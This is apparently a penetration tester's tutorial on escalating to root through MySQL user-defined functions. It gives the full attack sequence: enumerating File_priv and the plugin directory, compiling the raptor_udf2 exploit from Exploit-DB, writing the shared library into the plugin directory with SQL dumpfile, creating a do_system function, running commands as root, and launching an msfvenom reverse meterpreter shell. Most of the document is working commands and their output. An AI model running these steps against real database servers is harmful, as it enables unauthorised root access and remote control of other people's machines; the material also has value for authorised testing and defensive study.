# MySQL User Defined Function Exploitation
## Exploit Enumeration
This exploit is used for privilege escalation and requires `File_priv` access fo rthe current user. To check this, try,
```
mysql> select File_priv from mysql.user where user = substring_index(user(), '@', 1) ;
+-----------+
| File_priv |
+-----------+
| Y         |
| Y         |
| Y         |
| Y         |
+-----------+
4 rows in set (0.00 sec)
```
As you can see, I have the permission denoted as 'Y'. 

Next, we need to see the MySQL services host OS and compiled variable names with the following two SQL queries,
```
mysql> select @@version_compile_os, @@version_compile_machine;select @@version_compile_os, @@version_compile_machine;
+----------------------+---------------------------+
| @@version_compile_os | @@version_compile_machine |
+----------------------+---------------------------+
| debian-linux-gnu     | x86_64                    |
+----------------------+---------------------------+
1 row in set (0.00 sec)

mysql> show variables like '%compile%';show variables like '%compile%';

+-------------------------+------------------+
| Variable_name           | Value            |
+-------------------------+------------------+
| version_compile_machine | x86_64           |
| version_compile_os      | debian-linux-gnu |
+-------------------------+------------------+
2 rows in set (0.00 sec)
```
Now we need to find the plugin directory with the following SQL query,
```
mysql> select @@plugindir;
+------------------------+
| @@plugin_dir           |
+------------------------+
| /usr/lib/mysql/plugin/ |
+------------------------+
1 row in set (0.00 sec)
```
Now, we know that the plugin must be located in `/usr/lib/mysql/plugin/`. This directory will most likely only be accessible (writeable at least) by root. What our goal is to use MySQL functions to write to this directory. Well, we know that we are using a 64bit version of MySQL from the output above, `x86_64`. This means we can obtain one online and hope that it is valid (and safe) OR simply comile our own as so,

## MySQL UDF Exploit (Exploit-DB)
We will be using this exploit "MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)" from [Exploit-DB.com](https://www.exploit-db.com/exploits/1518). Download the exploit to the `/tmp` or some other writeable directory, and compile it with,
```
user@target:/tmp$ gcc -g -c raptor_udf2.c -fPIC
```
This will create `raptor_udf2.o` which we will now use to compile the plugin as so,
```
user@target:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Now, we should have the file `raptor_udf2.so`. Let's use it with the MySQL monitor shell to exploit the damn thing.
```
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
mysql> \! sh
sh-2.05b$ cat /tmp/out
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
```
So, now, we can upload a reverse meterpreter shell, made with MSFVenom, to the target system into `/tmp`, named LinRevMet555, and execute it as root with,
```
mysql> select do_system('/tmp/LinRevMet5555');
```
And get a shell as root.
